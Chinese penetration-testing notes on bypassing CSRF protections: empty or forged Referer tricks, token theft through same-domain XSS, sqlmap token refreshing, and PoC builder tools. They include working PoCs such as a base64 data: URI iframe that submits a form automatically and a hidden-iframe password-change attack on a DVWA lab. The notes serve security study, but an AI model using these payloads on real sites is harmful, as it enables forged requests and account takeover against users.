# CSRF补充 #

## 关于绕过referer ##
**1.查找当前域下XSS来提交数据**

涉及跨域问题，底下突破token有讲。

[http://blog.csdn.net/joyhen/article/details/21631833](http://blog.csdn.net/joyhen/article/details/21631833)

**2.空Referer绕过**

我们知道正常的页面跳转，浏览器都会自动带上Referer，那么现在的问题就变成了什么情况下浏览器会不带Referer？通过一些资料，可以大致总结为两种情况：
> - 通过地址栏，手动输入；从书签里面选择；通过实现设定好的手势。上面说的这三种都是用户自己去操作，因此不算CSRF。
> - 跨协议间提交请求。常见的协议：ftp://,http://,https://,file://,javascript:,data:.最简单的情况就是我们在本地打开一个HTML页面，这个时候浏览器地址栏是file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。那么我们接下来可以利用data:协议来构造一个自动提交的CSRF攻击。当然这个协议是IE不支持的，我们可以换用javascript.
假如http://a.b.com/d 这个接口存在空Referer绕过的CSRF，那么我们的POC可以是这样的：

    <html>
    <body>
       <iframe src="data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg==">
    </doby>
    </html>
上面iframe的src的代码其实是：

    <form method=post action=http://a.b.com/d><input type=text name='id' value='123'/></form><script>document.forms[0].submit();</script>
这就是利用data:\\\协议自动提交表单到有缺陷的CGI.

**3.利用https协议**

  https向http跳转的时候Referer为空，自己部署一个https的webshell，然后在服务器上写如如下攻击页面：

    <iframe src="https://xxxxx.xxxxx/attack.php">
其中attack.php写上CSRF攻击代码。

**4.判断Referer是某域情况下绕过**

比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后<img "csrf地址">  之后在把文章地址发出去 就可以伪造。

     <img src="https://xxxxx.xx.com/attack.php">

**5.判断Referer是否存在某关键词**

例如Dvwa-CSRF-Medium级别

存在漏洞的代码：

    <?php
    
    if( isset( $_GET[ 'Change' ] ) ) {
    
    // Checks to see where the request came from
    
    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) { // Get input，代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名）
    
    $pass_new  = $_GET[ 'password_new' ];
    
    $pass_conf = $_GET[ 'password_conf' ];
    
    // Do the passwords match?
    
    if( $pass_new == $pass_conf ) {
    
    // They do!
    
    $pass_new = mysql_real_escape_string( $pass_new );$pass_new = md5( $pass_new );
    
    // Update the database
    
    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";$result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' );// Feedback for the user
    
    echo "<pre>Password Changed.</pre>";
    
    }
    
    else {
    
    // Issue with passwords matching
    
    echo "<pre>Passwords did not match.</pre>";
    
    }
    
    }
    
    else {
    
    // Didn't come from a trusted source
    
    echo "<pre>That request didn't look correct.</pre>";}
    
    mysql_close();
    
    }
    
    ?>
referer判断存在不存在xxx.com这个关键词,在网站新建一个xxx.com目录 把CSRF存放在xxx.com目录,即可绕过：

    <iframe src="https://xxxxx.xxxxx/xxx.com/attack.php">
或者将攻击页面命名为包含关键字的名称也可绕过：

    <iframe src="https://xxxxx.xxxxx/xxx.com.php">

**6.判断referer是否有某域名**

判断了Referer开头是否以123.com以及123子域名,不验证根域名为123.com,那么我这里可以构造子域名x.123.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。

## 二.关于突破token ##
**1.看到一篇blog**

    http://blog.csdn.net/u011066706/article/details/51175351
csrf token，每次提交一个页面都会改变的值。 网上很多教程都说burp结合sqlmap绕过csrf，个人感觉很麻烦，后看到外国牛人的writeup，介绍了sqlmap配合脚本脚本绕过csrf的限制，感觉比结合burp方便。首先我们需要写一个脚本，先获取csrf的值，然后结合sqlmap的--eval参数就可以绕过csrf。原理其实很简单，分两步走，第一步获取页面csrf的值，然后以获得的值加入header中结合sqlmap再加载漏洞脚本测试网站。

比如下面是获取csrf的Python脚本getCsrf.py

    import urllib2  
    import re  
      
    def get_csrf():  
    # Load a page to generate a CSRF token  
    opener = urllib2.build_opener()  
    opener.addheaders.append(('Cookie', 'PHPSESSID=<insert Sycamore session id>'))  
    page = opener.open('http://<insert host>/blog.php?view=2').read()  
      
    # Extract the token  
    match = re.search(r"window\.csrf = '(.+)';", page)  
    return match.group(1) 
把这个脚本放在sqlmap同目录下，kali是在/usr/share/sqlmap/,然后抓取页面的包，命名为test.txt
运行命令（抓的包csrf值不用改，sqlmap会自动加载脚本替换csrf的值）

    sqlmap -r test.txt --eval="import getCsrf;csrf=getCsrf.get_csrf()"  


**2.同域下通过XSS获取token**

比如Dvwa-CSRF-high级别：

存在漏洞的代码：

    <?php 
    
    if( isset( $_GET[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 
    
    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 
    
    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
    // They do! 
    $pass_new = mysql_real_escape_string( $pass_new ); 
    $pass_new = md5( $pass_new ); 
    
    // Update the database 
    $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
    $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 
    
    // Feedback for the user 
    echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
    // Issue with passwords matching 
    echo "<pre>Passwords did not match.</pre>"; 
    } 
    
    mysql_close(); 
    } 
    
    // Generate Anti-CSRF token 
    generateSessionToken(); 
    
    ?>
如果我们的攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。假设我们这样构造页面：

    <script type="text/javascript">
    function attack()
    {
    document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;
    document.getElementById("transfer").submit();
    }
    </script>
    <iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">
    </iframe>
    <body onload="attack()">
    <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">
    <input type="hidden" name="password_new" value="password">
    <input type="hidden" name="password_conf" value="password">
    <input type="hidden" name="user_token" value="">
    <input type="hidden" name="Change" value="Change">
    </form>
    </body>
理想与现实的差距是巨大的，这里牵扯到了跨域问题，而现在的浏览器是不允许跨域请求的。这里简单解释下跨域，我们的框架iframe访问的地址是

    http://192.168.153.130/dvwa/vulnerabilities/csrf
位于服务器192.168.153.130上，而我们的攻击页面位于黑客服务器10.4.253.2上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送信息给域名B的页面，所以我们的攻击脚本是不可能取到改密界面中的user_token。
由于跨域是不能实现的，所以我们要将攻击代码注入到目标服务器192.168.153.130中，才有可能完成攻击。所以我们可以利用Dvwa中的XSS-high级别板块偷取token后，再进行CSRF（两者位于同一域）。

**3.特殊情况**

- token写到Url中，通过referer偷取token:wooyun-2015-090935
- token没绑定请求，造成复用
- token可预测，即不完全随机，比如时间戳+md5等。
- 这里还有一篇文章，关于Window.Opener绕过CSRF保护：
当一个窗口由另一个窗口打开时，这个窗口会维护一个指向前一个窗口的参考值，这个值就是window.opener。如果当前窗口没有由其他窗口来打开，那么window.opener值为空。为空即会拦截CSRF请求。

[http://www.freebuf.com/vuls/83398.html](http://www.freebuf.com/vuls/83398.html)
## 三.关于构造CSRF Poc ##
**1.使用burp（pro版）构造**

填写表单时使用burp截断，然后生成Poc:
![](http://i.imgur.com/rtWZ7t4.png)
                                             burp构造CSRF Poc

**2.使用CSRFTester**

设置代理127.0.0.1：8008

双击run.bat(需自己配好Java环境)

然后填写表单时，软件会自动抓取到信息：
![](http://i.imgur.com/7SZ7rip.png)

3.在线构造

[    http://evilcos.me/lab/xssor/](http://evilcos.me/lab/xssor/)
